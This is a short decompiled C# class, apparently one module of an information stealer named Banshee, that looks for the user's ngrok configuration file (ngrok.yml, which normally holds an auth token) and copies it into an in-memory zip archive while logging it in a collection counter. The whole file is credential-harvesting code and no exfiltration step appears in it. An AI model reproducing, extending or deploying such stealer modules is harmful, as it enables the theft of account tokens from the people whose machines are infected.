﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Applications
{
	// Token: 0x0200009F RID: 159
	public class Ngrok : ITarget
	{
		// Token: 0x060001D8 RID: 472 RVA: 0x0000FB6C File Offset: 0x0000FB6C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ngrok", "ngrok.yml");
			if (File.Exists(text))
			{
				string text2 = "Ngrok\\ngrok.yml";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Ngrok";
				zip.AddFile(text2, File.ReadAllBytes(text));
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
